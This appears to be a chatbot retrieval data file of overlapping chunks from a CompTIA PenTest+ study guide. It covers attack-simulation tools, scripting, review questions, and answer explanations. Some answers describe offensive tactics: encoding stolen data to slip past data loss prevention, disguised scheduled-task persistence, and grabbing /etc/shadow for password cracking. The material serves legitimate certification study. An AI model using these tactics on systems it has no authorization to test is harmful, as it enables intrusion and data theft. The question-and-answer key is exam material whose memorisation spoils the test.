vulnerabilities. The following BAS tools are covered on the PenTest+ exam: Caldera is a modular, automated adversary emulation system developed by MITRE. It allows penetration testers to simulate threat actor behavior by executing various tactics and techniques from the MITRE ATT&CK framework. Caldera automates red team operations and helps identify gaps in defensive capabilities by mimicking adversary actions. Infection Monkey is an open source BAS tool designed to test the resiliency of data centers and cloud environments against cyberattacks. It simulates malware infections by attempting to spread throughout a network, exploiting vulnerabilities and weak configurations. Infection Monkey provides valuable insights into network security by showing how far an attacker can move laterally after breaching a system. Atomic Red Team is a set of lightweight, open source tests that allow penetration
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	behavior by executing various tactics and techniques from the MITRE ATT&CK framework. Caldera automates red team operations and helps identify gaps in defensive capabilities by mimicking adversary actions. Infection Monkey is an open source BAS tool designed to test the resiliency of data centers and cloud environments against cyberattacks. It simulates malware infections by attempting to spread throughout a network, exploiting vulnerabilities and weak configurations. Infection Monkey provides valuable insights into network security by showing how far an attacker can move laterally after breaching a system. Atomic Red Team is a set of lightweight, open source tests that allow penetration testers and security teams to execute specific attack techniques across various platforms. The tests are mapped to the MITRE ATT&CK framework, enabling testers to simulate adversary tactics in a controlled manner. It's particularly useful for testing security controls and validating detection mechanisms. Common Use Cases Let's wrap up by looking at a few common use cases for automation portions of penetration tests: Scanning Systems Testers might create code that automatically performs port scans of an environment, processes those results, and then automatically triggers next steps based on the results of the initial scan. For example, if a port scan indicates that a web server is accepting HTTPS connections on port 443 (or another port), a follow‐up scan of that port might enumerate the SSL and/or TLS ciphers supported by the server and produce a report for penetration testers to review. Configuration Analysis of Target Systems When a penetration tester identifies a target system, automated code may probe the configuration of that system and produce a report that helps the tester identify possible next steps. Modifying of IP Addresses in Routine Activities This technique allows the rapid application of techniques to many different systems in an iterative fashion. We used this technique to cycle through IP addresses in the “for Loops” section of this chapter. Summary Scripting helps alleviate much of the tedious, repetitive work of penetration testing. By writing short scripts, penetration testers can quickly execute many different permutations of a command to assist with brute‐force attacks, network scanning, and similar tasks. This chapter scratched the surface of scripting to help you prepare for the PenTest+ exam. The exam requires that you have only a basic level of knowledge to analyze scripts written in Bash, PowerShell, or Python. Be prepared to recognize the language of different scripts, analyze code to interpret its function, and insert provided code segments in the correct places. Once you've completed the exam, you should consider expanding your skills in these languages to improve your penetration testing toolkit. Exam Essentials Explain how shell scripting languages provide basic functionality for automating command‐line activities. These scripting languages are designed for quick‐and‐dirty activities, such as automating work typically done at a command prompt. The two shell languages that you should be familiar with for the exam are Bash for macOS/Linux systems and PowerShell for Windows systems. Understand that advanced programming languages raise scripting to the next level. Python provides
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	interpret its function, and insert provided code segments in the correct places. Once you've completed the exam, you should consider expanding your skills in these languages to improve your penetration testing toolkit. Exam Essentials Explain how shell scripting languages provide basic functionality for automating command‐line activities. These scripting languages are designed for quick‐and‐dirty activities, such as automating work typically done at a command prompt. The two shell languages that you should be familiar with for the exam are Bash for macOS/Linux systems and PowerShell for Windows systems. Understand that advanced programming languages raise scripting to the next level. Python provides developers with fully functional programming languages designed to be able to manipulate complex input and perform just about any possible function. The real power of this language lies in the ability to load modules that contain code written by others. Understand how variables store values in memory for later use. All programming languages allow the developer to store data in variables, which may later be accessed programmatically. Depending on the programming language, arrays provide the ability to store multiple elements of the same (or different) data type in a single data structure for ease of reference and manipulation. Explain how flow control elements allow programmers to structure the logical design of their code. Conditional execution, using the if..then..else clause, allows developers to test logical conditions before executing code. for loops allow the repetitive execution of code for a specified number of times. while loops continue executing code until a logical condition is no longer true. Understand how error handling allows the developer to specify code that should execute when an error occurs. Many security vulnerabilities arise when unhandled errors persist in code. The try..catch clause in most programming languages allows developers to avoid this situation by providing code to handle error conditions explicitly. Describe how penetration testers use code development skills to analyze exploit code. When penetration testers encounter exploit code that was used against them or that they intend to use in an attack, they should look for key pieces of evidence that may help them identify the nature of the code. These include enumeration techniques, downloading files, and launching remote access. Demonstrate how penetration testers may develop software to automate their activities. Software development helps reduce the tedious nature of penetration testing by automating routine tasks. Key opportunities for automation include modifying the IP addresses targeted by different tools, scanning systems of interest, and performing configuration analysis. Lab Exercises Activity 12.1: Reverse DNS Lookups In this chapter, we created scripts in a variety of languages that were designed to perform reverse DNS lookups of an entire network subnet. Modify one of those scripts to work on your own network. You may use the code in the book as a starting point and perform this task in the language of your choice. Activity 12.2: Nmap Scan In this chapter, we created scripts in a variety of languages that were designed to perform Nmap scans of an entire network subnet.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	tools, scanning systems of interest, and performing configuration analysis. Lab Exercises Activity 12.1: Reverse DNS Lookups In this chapter, we created scripts in a variety of languages that were designed to perform reverse DNS lookups of an entire network subnet. Modify one of those scripts to work on your own network. You may use the code in the book as a starting point and perform this task in the language of your choice. Activity 12.2: Nmap Scan In this chapter, we created scripts in a variety of languages that were designed to perform Nmap scans of an entire network subnet. Modify one of those scripts to work on your own network. You may use the code in the book as a starting point and perform this task in the language of your choice. Review Questions You can find the answers in the Appendix A. 1. Which of the following operating systems support PowerShell interpreters? A. Linux B. macOS C. Windows D. All of the above 2. Which of the following PowerShell modules is used for network situational awareness, allowing penetration testers to enumerate domain users, groups, and permissions within an Active Directory environment? A. PowerUpSQL B. Empire C. PowerView D. PowerSploit 3. Examine the following line of code. In what programming language is it written? Write-Host "The system contains several serious vulnerabilities." A. Perl B. PowerShell C. JavaScript D. Python 4. Which one of the following statements does not correctly describe the Python programming language? A. It is a general‐purpose programming language. B. It is an interpreted language. C. It uses scripts. D. It is a compiled language. 5. Which one of the following commands will allow the file owner to execute a Bash script? A. chmod o+e script.sh B. chmod o+x script.sh C. chmod u+e script.sh D. chmod u+x script.sh 6. Which one of the following PowerShell execution policies allows the execution of any PowerShell script that you write on the local machine but requires that scripts downloaded from the Internet be signed by a trusted publisher? A. Bypass B. Unrestricted C. RemoteSigned D. AllSigned 7. Which one of the following lines of code would create an array in a PowerShell script? A. $ports = 22, 25, 80, 443 B. ports = (22,25,80,443) C. ports = [22,25,80,443] D. $ports = [22,25,80,443] 8. What comparison operator tests for equality in Python? A. ‐eq B. ‐ne C. == D. != 9. What value would be used to encode a space in a URL string? A. %20 B. %21 C. %22 D. %23 10. Which of the following tools simulates malware infections by attempting to spread throughout a network, testing the security of data centers and cloud environments? A. Atomic Red Team B. PowerView C. Infection Monkey D. Caldera 11. Which of the following sets of languages allow the direct concatenation of a string and an integer? A. Python and Bash B. Bash and PowerShell C. Python and PowerShell D. Python, Bash, and PowerShell 12. What is the limit to the number
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	What value would be used to encode a space in a URL string? A. %20 B. %21 C. %22 D. %23 10. Which of the following tools simulates malware infections by attempting to spread throughout a network, testing the security of data centers and cloud environments? A. Atomic Red Team B. PowerView C. Infection Monkey D. Caldera 11. Which of the following sets of languages allow the direct concatenation of a string and an integer? A. Python and Bash B. Bash and PowerShell C. Python and PowerShell D. Python, Bash, and PowerShell 12. What is the limit to the number of elif clauses in a Bash script? A. 1 B. 2 C. 10 D. No limit 13. Consider the following Python code: if 1 == 1: print("hello") elif 3 == 3: print("hello") else: print("hello") How many times will this code print the word “hello”? A. 0 B. 1 C. 2 D. 3 14. Analyze the following segment of code: Do { $test='mike' + $i $cracked = Test-Password $test $i++ } While($cracked -eq 0) In what language is this code written? A. Ruby B. PowerShell C. Python D. Bash 15. Analyze the following segment of code: if [ $weekday==1 ] then /usr/local/bin/nmap 192.168.1.1 elif [ $weekday==3 ] then /usr/local/bin/nmap 192.168.1.2 else fi /usr/local/bin/nmap 192.168.1.0/24 In what language is this code written? A. Ruby B. PowerShell C. Python D. Bash 16. Analyze the following segment of code: for hst in range(0,256): ip= net + str(hst) print(ip, ': ', socket.gethostbyaddr(ip), '\n') In what language is this code written? A. Ruby B. PowerShell C. Python D. Bash 17. What Unix command can you use to listen for input on a network port? A. grep B. sed C. awk D. nc 18. Which one of the following programming languages does not offer a built‐in robust error‐handling capability? A. PowerShell B. Python C. Ruby D. Bash 19. What value would be used to encode an ampersand in a URL string? A. %24 B. %25 C. %26 D. %27 20. What comparison operator tests to see if one number is greater than or equal to another number in Bash? A. ‐gt B. ‐ge C. > D. >= Appendix A: Answers to Review Questions Chapter 2: Planning and Scoping Penetration Tests 1. C. A statement of work covers the working agreement between two parties and is used in addition to an existing contract or master services agreement (MSA). An NDA is a nondisclosure agreement, and the acronym MOD was made up for this question. 2. D. PTES, OSSTMM, and ISSAF are all penetration testing methodologies or standards. MITRE's ATT&CK framework describes adversary tactics and techniques but does not outline how to perform a penetration test. 3. C. Known environment testing, often also known as crystal box or white‐box testing, provides complete access and visibility. Unknown environment, or black‐box testing, provides no information, whereas partial knowledge, or gray‐box testing, provides limited information. 4. B. A nondisclosure agreement (NDA) covers the data and other information that a penetration tester may
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	An NDA is a nondisclosure agreement, and the acronym MOD was made up for this question. 2. D. PTES, OSSTMM, and ISSAF are all penetration testing methodologies or standards. MITRE's ATT&CK framework describes adversary tactics and techniques but does not outline how to perform a penetration test. 3. C. Known environment testing, often also known as crystal box or white‐box testing, provides complete access and visibility. Unknown environment, or black‐box testing, provides no information, whereas partial knowledge, or gray‐box testing, provides limited information. 4. B. A nondisclosure agreement (NDA) covers the data and other information that a penetration tester may encounter or discover during their work. It acts as a legal agreement preventing disclosure of that information. 5. C. Cloud service providers don't typically allow testing to be conducted against their services. Charles may recommend that the company ask for third‐party security audit information instead. Cloud systems and large environments can be difficult to scope and may require more time, but the primary issue here is the ability to even legitimately conduct the assessment that is being requested. 6. D. The IP address or network that Alex is sending his traffic from was most likely blacklisted as part of the target organization's defensive practices. A whitelist would allow him in, and it is far less likely that the server or network has gone down. 7. A. A master service agreement (MSA) is a contract that defines the terms under which future work will be completed. Specific work is then typically handled under a statement of work (SOW). 8. C. The organization that Cassandra is testing has likely deployed network access control (NAC). Her system will not have the proper NAC client installed, and she will be unable to access that network jack without authenticating and having her system approved by the NAC system. 9. A. An objectives‐based assessment specifically targets goals like gaining access to specific systems or data. A compliance‐based assessment is conducted as part of compliance efforts and will focus on whether systems are properly secured or meet standards. A red‐team assessment is intended to simulate an actual attack or penetration, and testers will focus on finding ways in and maximizing access rather than comprehensively identifying and testing all the vulnerabilities and flaws that they can find. Black‐team assessments are not a commonly used penetration testing term. 10. C. Knowing the SSIDs that are in scope is critical when working in shared buildings. Penetrating the wrong network could cause legal or even criminal repercussions for a careless penetration tester! 11. A. Time‐of‐day restrictions can be used to ensure tests occur when the systems are not in use, allowing time for recovery or restoration if something goes wrong. Types of allowed tests or denied tests are less likely to be used since they can limit the value of a test, and restricting physical locations is uncommon for smaller organizations that don't have many distinct locations. 12. C. Scope creep occurs when additional items are added to the scope of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	when working in shared buildings. Penetrating the wrong network could cause legal or even criminal repercussions for a careless penetration tester! 11. A. Time‐of‐day restrictions can be used to ensure tests occur when the systems are not in use, allowing time for recovery or restoration if something goes wrong. Types of allowed tests or denied tests are less likely to be used since they can limit the value of a test, and restricting physical locations is uncommon for smaller organizations that don't have many distinct locations. 12. C. Scope creep occurs when additional items are added to the scope of an assessment. Christine has gone beyond the scope of the initial assessment agreement. This can be expensive for clients or may cost Christine income if the additional time and effort is not accounted for in an addendum to his existing contract. 13. D. The PCI DSS standard is an industry standard for compliance for credit card processing organizations. Thus, Lucas is conducting a compliance‐based assessment. 14. B. Assessments are valid only when they occur. Systems change due to patches, user changes, and configuration changes on a constant basis. Greg's point‐in‐time validity statement is a key element in penetration testing engagement contracts. 15. C. Access to a wired network can require physical access, which could be provided as part of a partial knowledge penetration test. In an unknown environment test, Ian might have to identify a way to compromise a system connected to the network remotely or to gain physical access to the building where the systems are. Knowing the IP ranges or the SSIDs of wireless networks is not required for this type of test. IP ranges can be determined once he is connected, and the test specifically notes that wired networks are not connected. 16. C. Megan should look for API documentation. If the application uses an API, she may be able to use default API credentials or methods to gather data. The problem does not mention a database, and system passwords and network configuration settings are not as useful here. 17. C. While the ISO or the sponsor may be the proper signing authority, it is important that Charles verify that the person who signs actually is the organization's proper signing authority. That means this person must have the authority to commit the organization to a penetration test. Unfortunately, it isn't a legal term, so Charles may have to do some homework with his project sponsor to ensure that this happens correctly. 18. B, C. Both the comprehensiveness of the test and the limitation that it is only relevant at the point in time it is conducted are appropriate disclaimers for Elaine to include. The risk and impact tolerance of the organization being assessed should be used to define the scope and rules of engagement for the assessment. 19. B. The Open Worldwide Application Security Project provides mobile application testing guidelines as part of their documentation, making it the best option on this list for Jen. NIST provides
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to do some homework with his project sponsor to ensure that this happens correctly. 18. B, C. Both the comprehensiveness of the test and the limitation that it is only relevant at the point in time it is conducted are appropriate disclaimers for Elaine to include. The risk and impact tolerance of the organization being assessed should be used to define the scope and rules of engagement for the assessment. 19. B. The Open Worldwide Application Security Project provides mobile application testing guidelines as part of their documentation, making it the best option on this list for Jen. NIST provides high‐level guidance about what tests should include, KALI is a security‐focused Linux distribution, and ISSAF is a dated penetration testing standard. 20. A. A red‐team assessment with zero knowledge will attempt a penetration test as though they were actual attackers who do not have prior or insider knowledge of the organization. Full knowledge assessments provide more knowledge than attackers can be expected to have, and goals‐based assessments target specific systems or elements of an organization rather than the broader potential attack surface that actual attackers may target. Chapter 3: Information Gathering 1. D. This is a port scan, not a vulnerability scan, so Megan will not be able to determine if the services are vulnerable just from this scan. The Nmap scan will show the state of the ports, both TCP and UDP. 2. C. FOCA, or Fingerprinting Organizations with Collected Archives, is a useful tool for searching for metadata via search engines. ExifTool is used for individual files. MetaSearch was made up for this question, and although Nmap has many functions, it isn't used for metadata searches via search engines. 3. A. Zarmeena knows that TCP ports 139, 445, and 3389 are all commonly used for Windows services. Although those ports could be open on a Linux, Android, or iOS device, Windows is her best bet. 4. A. Only scanning via UDP will miss any TCP services. Since the great majority of services in use today are provided as TCP services, this would not be a useful way to conduct the scan. Setting the scan to faster timing (3 or faster), changing from a TCP connect scan to a TCP SYN scan, or limiting the number of ports tested are all valid ways to speed up a scan. Charles needs to remain aware of what those changes can mean, since a fast scan may be detected or cause greater load on a network, and scanning fewer ports may miss some ports. 5. D. Karen knows that many system administrators move services from their common service ports to alternate ports and that 8080 and 8443 are likely alternate HTTP (TCP 80) and HTTPS (TCP 443) server ports, and she will use a web browser to connect to those ports to check them. She could use Telnet for this testing, but it requires significantly more manual work to gain the same result, making it a poor second choice unless Karen doesn't
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	since a fast scan may be detected or cause greater load on a network, and scanning fewer ports may miss some ports. 5. D. Karen knows that many system administrators move services from their common service ports to alternate ports and that 8080 and 8443 are likely alternate HTTP (TCP 80) and HTTPS (TCP 443) server ports, and she will use a web browser to connect to those ports to check them. She could use Telnet for this testing, but it requires significantly more manual work to gain the same result, making it a poor second choice unless Karen doesn't have another option. 6. A. ExifTool is designed to pull metadata from images and other files. Grep may be useful to search for specific text in a file, but it won't pull the range of possible metadata from the file. PsTools is a Windows Sysinternals package that includes a variety of process‐oriented tools. Nginx is a web server, load balancer, and multipurpose application services stack. 7. D. OS identification in Nmap is based on a variety of response attributes. In this case, Nmap's best guess is that the remote host is running a Linux 2.6.9–2.6.33 kernel, but it cannot be more specific. It does not specify the distribution, the patch level, or when the system was last patched. 8. D. The full range of ports available to both TCP and UDP services is 1–65,535. Although port 0 exists, it is a reserved port and shouldn't be used. 9. D. The TCP connect scan is often used when an unprivileged account is the tester's only option. Linux systems typically won't allow an unprivileged account to have direct access to create packets, but they will allow accounts to send traffic. Steve probably won't be able to use a TCP SYN scan, but a connect scan is likely to work. The other flags shown are for version testing (‐sV) and output type selection (‐oA), and ‐u doesn't do anything at all. 10. C. WHOIS provides information that can include the organization's physical address, registrar, contact information, and other details. Nslookup will provide IP address or hostname information, whereas the host command provides IPv4 and IPv6 addresses as well as email service information. traceroute attempts to identify the path to a remote host as well as the systems along the route. 11. C. The ‐T flag in Nmap is used to set scan timing. Timing settings range from 0 (paranoid) to 5 (insane). By default, it operates at 3, or normal. With timing set to a very slow speed, Chris will run his scan for a very, very long time on a /16 network. 12. B. The Script Kiddie output format that Nmap supports is entirely for fun—you should never have a practical need to use the ‐oS flag for an actual penetration test. 13. B. The strings command parses a file for strings of text and outputs them. It is often useful for analyzing binary files, since you can quickly check for information
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Timing settings range from 0 (paranoid) to 5 (insane). By default, it operates at 3, or normal. With timing set to a very slow speed, Chris will run his scan for a very, very long time on a /16 network. 12. B. The Script Kiddie output format that Nmap supports is entirely for fun—you should never have a practical need to use the ‐oS flag for an actual penetration test. 13. B. The strings command parses a file for strings of text and outputs them. It is often useful for analyzing binary files, since you can quickly check for information with a single quick command‐line tool. Netcat, while often called a pentester's Swiss Army knife, isn't useful for this type of analysis. Eclipse is an IDE and would be useful for editing code or for managing a full decompiler in some cases. 14. C. The Asia‐Pacific NIC covers Asia, Australia, New Zealand, and other countries in the region. RIPE covers central Asia, Europe, the Middle East, and Russia, and ARIN covers the United States, Canada, parts of the Caribbean region, and Antarctica. 15. B. Checking for DNS load balancing via ping requires checking time to live (TTL) and IP address differences. Using Nmap or Nessus is less likely to be successful, because most devices in a pool should provide the same services and service versions. WHOIS records do not show load balancing details. 16. B. Charles has issued a command that asks hping to send SYN traffic (‐S) in verbose mode (‐V) to remotesite.com on port 80. 17. C. A series of three asterisks during a traceroute means that the host query has failed but that traffic is passing through. Many hosts are configured to not respond to this type of traffic but will route traffic properly. 18. A. The Common Weakness Enumeration is a community‐developed list of hardware and software weaknesses. Although OWASP provides a massive amount of application security knowledge, it is not in and of itself a listing or standard for listing flaws. The Diamond Model is a model designed to evaluate intrusions, and CVE, the Common Vulnerabilities and Exposures database, focuses on vulnerabilities for commercial and open‐source projects and thus will not typically be used for internal applications and code. 19. B. Pentesters are always on the lookout for indicators of improper maintenance. Lazy or inattentive administrators are more likely to make mistakes that allow pentesters in. 20. D. All of these tools except ExifTool are usable as port scanners with some clever use of command‐line flags and options. Chapter 4: Vulnerability Scanning 1. C. Trivy is a dedicated container vulnerability scanner and is the most appropriate tool for use in this scenario. Ryan might discover the same vulnerabilities using the general‐purpose Nessus or OpenVAS scanner, but they are not dedicated database vulnerability scanning tools. Nikto is a web application vulnerability scanner. 2. D. A full scan is likely to provide more useful and actionable results because it includes more tests. There is no requirement in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in. 20. D. All of these tools except ExifTool are usable as port scanners with some clever use of command‐line flags and options. Chapter 4: Vulnerability Scanning 1. C. Trivy is a dedicated container vulnerability scanner and is the most appropriate tool for use in this scenario. Ryan might discover the same vulnerabilities using the general‐purpose Nessus or OpenVAS scanner, but they are not dedicated database vulnerability scanning tools. Nikto is a web application vulnerability scanner. 2. D. A full scan is likely to provide more useful and actionable results because it includes more tests. There is no requirement in the scenario that Gary avoids detection, so a stealth scan is not necessary. However, this is an unknown environment test, so it would not be appropriate for Gary to have access to scans conducted on the internal network. 3. A. An asset inventory supplements automated tools with other information to detect systems present on a network. The asset inventory provides critical information for vulnerability scans. It is appropriate to share this information with penetration testers during a known environment penetration test. 4. D. PCI DSS requires that organizations conduct vulnerability scans on at least a quarterly basis, although many organizations choose to conduct scans on a much more frequent basis. 5. B. Qualys, Nessus, and OpenVAS are all examples of vulnerability scanning tools. Snort is an intrusion detection and prevention system. 6. A. Encryption technology is unlikely to have any effect on the results of vulnerability scans because it does not change the services exposed by a system. Firewalls and intrusion prevention systems may block inbound scanning traffic before it reaches target systems. Containerized and virtualized environments may prevent external scanners from seeing services exposed within the containerized or virtualized environment. 7. D. Credentialed scans only require read‐only access to target servers. Renee should follow the principle of least privilege and limit the access available to the scanner. 8. C. Common Product Enumeration (CPE) is the SCAP component that provides standardized nomenclature for product names and versions. 9. D. Because this is an unknown environment scan, Ken should not (and most likely cannot) conduct an internal scan until he first compromises an internal host. Once he gains this foothold on the network, he can use that compromised system as the launching point for internal scans. 10. C. The Federal Information Security Management Act (FISMA) requires that government agencies conduct vulnerability scans. HIPAA, which governs hospitals and doctors’ offices, does not include a vulnerability scanning requirement, nor does FERPA, which covers educational institutions. 11. C. Internet of Things (IoT) devices are examples of nontraditional systems that may be fragile and highly susceptible to failure during vulnerability scans. Web servers and firewalls are typically designed for exposure to wider networks and are less likely to fail during a scan. 12. B. The organization's risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk averse, it may choose to conduct scans more frequently to minimize the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scans. HIPAA, which governs hospitals and doctors’ offices, does not include a vulnerability scanning requirement, nor does FERPA, which covers educational institutions. 11. C. Internet of Things (IoT) devices are examples of nontraditional systems that may be fragile and highly susceptible to failure during vulnerability scans. Web servers and firewalls are typically designed for exposure to wider networks and are less likely to fail during a scan. 12. B. The organization's risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk averse, it may choose to conduct scans more frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan. 13. D. Scan schedules are most often determined by the organization's risk appetite, regulatory requirements, technical constraints, business constraints, and licensing limitations. Most scans are automated and do not require staff availability. 14. B. Adam is conducting static code analysis by reviewing the source code. Dynamic code analysis requires running the program, and both mutation testing and fuzzing are types of dynamic analysis. 15. C. Ryan should first run his scan against a test environment to identify likely vulnerabilities and assess whether the scan itself might disrupt business activities. 16. C. While reporting and communication are an important part of vulnerability management, they are not included in the life cycle. The three life‐cycle phases are detection, remediation, and testing. 17. A. Continuous monitoring incorporates data from agent‐based approaches to vulnerability detection and reports security‐related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities. 18. B. Systems have a moderate impact from a confidentiality perspective if the unauthorized disclosure of information could be expected to have a serious adverse effect on organizational operations, organizational assets, or individuals. 19. A. The Common Vulnerability Scoring System (CVSS) provides a standardized approach for measuring and describing the severity of security vulnerabilities. Jessica could use this scoring system to prioritize issues raised by different source systems. 20. B. Penetration testers should always consult the statement of work (SOW) for guidance on how to handle situations where they discover critical vulnerabilities. The SOW may require reporting these issues to management immediately, or it may allow the continuation of the test exploiting the vulnerability. Chapter 5: Analyzing Vulnerability Scans 1. B. Although the network can support any of these protocols, internal IP disclosure vulnerabilities occur when a network uses Network Address Translation (NAT) to map public and private IP addresses but a server inadvertently discloses its private IP address to remote systems. 2. C. The privileges required (PR) metric describes whether the attacker needs no user privileges, normal user privileges, or administrative user privileges to conduct the attack. The other vectors described in this question are the attack vector (AV), attack complexity (AC), and attack confidentiality (VC) vectors. They would not contain information about user authentication. 3. C. An access complexity of “low” indicates that exploiting
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	any of these protocols, internal IP disclosure vulnerabilities occur when a network uses Network Address Translation (NAT) to map public and private IP addresses but a server inadvertently discloses its private IP address to remote systems. 2. C. The privileges required (PR) metric describes whether the attacker needs no user privileges, normal user privileges, or administrative user privileges to conduct the attack. The other vectors described in this question are the attack vector (AV), attack complexity (AC), and attack confidentiality (VC) vectors. They would not contain information about user authentication. 3. C. An access complexity of “low” indicates that exploiting the vulnerability does not require any specialized conditions. A value of “high” indicates that specialized conditions are required. High and low are the only two possible values for this metric. 4. C. If any of these measures is marked as H, for High, it indicates the potential for a complete compromise of the system. 5. D. Version 4.0 of CVSS is currently available and is the version described in this chapter. 6. B. The CVSS exploitability score is calculated using the attack vector, attack complexity, attack requirements, privileges required, and user interaction metrics. 7. B. Vulnerabilities that have a CVSS base score between 4.0 and 6.9 fall into the Medium rating category. 8. A. A false positive error occurs when the vulnerability scanner reports a vulnerability that does not actually exist. 9. B. It is unlikely that a database table would contain information relevant to assessing a vulnerability scan report. Logs, SIEM reports, and configuration management systems are much more likely to contain relevant information. 10. C. There are three major requirements for a scan to be considered complete: All network segments, systems, and applications within the scope have been covered and the scan configurations are appropriate for the technologies being assessed. The scan has been conducted with sufficient privileges to access and evaluate the systems fully, as restricted access might lead to incomplete results, such as missing out on vulnerabilities that require authenticated checks. Scans are scheduled at intervals that align with the organization's risk tolerance and the changing threat landscape, thus maintaining an up‐to‐date security posture. These do not include coverage of all user accounts. 11. D. Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program's use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. 12. C. Buffer overflow best describes this type of attack where more data than is allowed is inserted into a memory location, often resulting in erratic program behavior or a system crash. This technique exploits programming errors in buffer management, allowing attackers to interfere with the system. Malicious code, while potentially related, is a broader term that encompasses any code intended to cause undesired effects, security breaches, or damage to a system. Privilege escalation involves gaining elevated access to resources that are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	other information in memory with instructions that may be executed by a different process running on the system. 12. C. Buffer overflow best describes this type of attack where more data than is allowed is inserted into a memory location, often resulting in erratic program behavior or a system crash. This technique exploits programming errors in buffer management, allowing attackers to interfere with the system. Malicious code, while potentially related, is a broader term that encompasses any code intended to cause undesired effects, security breaches, or damage to a system. Privilege escalation involves gaining elevated access to resources that are normally protected from an application or user, which is not specifically described by inserting too much data into a buffer. LDAP injection is a technique used to exploit web‐based applications by manipulating LDAP statements through a web input, which is unrelated to the scenario of overflowing memory buffers. 13. D. Telnet is an insecure protocol that does not make use of encryption. The other protocols mentioned are all considered secure. 14. D. TLS 1.3 is a secure transport protocol that supports web traffic. The other protocols listed all have flaws that render them insecure and unsuitable for use. 15. B. Digital certificates are intended to provide public encryption keys and this would not cause an error. The other circumstances are all causes for concern and would trigger an alert during a vulnerability scan. 16. D. In a virtualized data center, the virtual host hardware runs a special operating system known as a hypervisor that mediates access to the underlying hardware resources. 17. A. VM escape vulnerabilities are the most serious issue that can exist in a virtualized environment, particularly when a virtual host runs systems of differing security levels. In an escape attack, the attacker has access to a single virtual host and then manages to leverage that access to intrude on the resources assigned to a different virtual machine. 18. B. Intrusion detection systems (IDSs) are a security control used to detect network or host attacks. The Internet of Things (IoT), supervisory control and data acquisition (SCADA) systems, and industrial control systems (ICSs) are all associated with connecting physical world objects to a network. 19. D. In a cross‐site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party. 20. A. In a SQL injection attack, the attacker seeks to use a web application to gain access to an underlying database. Semicolons and apostrophes are characteristic of these attacks. Chapter 6: Exploit and Pivot 1. B. TCP 445 is a service port typically associated with SMB services. 2. A. The Ruby on Rails vulnerability is the only vulnerability that specifically mentions remote code execution, which is most likely to allow Charles to gain access to the system. 3. B. The OpenSSH vulnerability specifically notes
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	visiting a trusted site into executing malicious code placed there by an untrusted third party. 20. A. In a SQL injection attack, the attacker seeks to use a web application to gain access to an underlying database. Semicolons and apostrophes are characteristic of these attacks. Chapter 6: Exploit and Pivot 1. B. TCP 445 is a service port typically associated with SMB services. 2. A. The Ruby on Rails vulnerability is the only vulnerability that specifically mentions remote code execution, which is most likely to allow Charles to gain access to the system. 3. B. The OpenSSH vulnerability specifically notes that it allows user enumeration, making this the best bet for what Charles wants to accomplish. 4. C. Metasploit searching supports multiple common vulnerability identifier systems, including CVE, BID, and EDB, but MSF was made up for this question. It may sound familiar, as the Metasploit console command is msfconsole. 5. A. Matt can safely assume that almost any modern Linux system will have SSH, making SSH tunneling a legitimate option. If he connects outbound from the compromised system to his system and creates a tunnel allowing traffic in, he can use his own vulnerability scanner through the tunnel to access the remote systems. 6. C. Fred has used the scheduled tasks tool to set up a weekly run of av.exe from a user directory at 9 a.m. It is fair to assume in this example that Fred has gained access to SSmith's user directory and has placed his own av.exe file there and is attempting to make it look innocuous if administrators find it. 7. B. On most Linux systems, the /etc/passwd file will contain a list of users as well as their home directories. Capturing both /etc/passwd and /etc/shadow are important for password cracking, making both desirable targets for pentesters. 8. C. Meterpreter is a memory‐resident tool that injects itself into another process. The most likely answer is that the system was rebooted, thus removing the memory‐resident Meterpreter process. Robert can simply repeat his exploit to regain access, but he may want to take additional steps to ensure continued access. 9. C. Encoding data will make it less likely that intrusion prevent and data loss prevention systems will identify acquired data, meaning that encoding is a useful technique. Sending the data to a public repository like GitHub is less likely to look unusual than an internal system opening a SSH tunnel to a previously unknown system. Sending via HTTP instead of HTTPS will make inspection of the outbound, unencoded data trivial for defenders, and hashing the data will not leave it in a recoverable state when it arrives. 10. C. A combination of fileless malware and living‐off‐the‐land techniques that use native tools and utilities will help Ian to ensure that he meets the rules of engagement of the penetration test he is conducting. Even cleaning up files will violate those rules, meaning that Ian should not add tools even if he is confident in his ability to clean
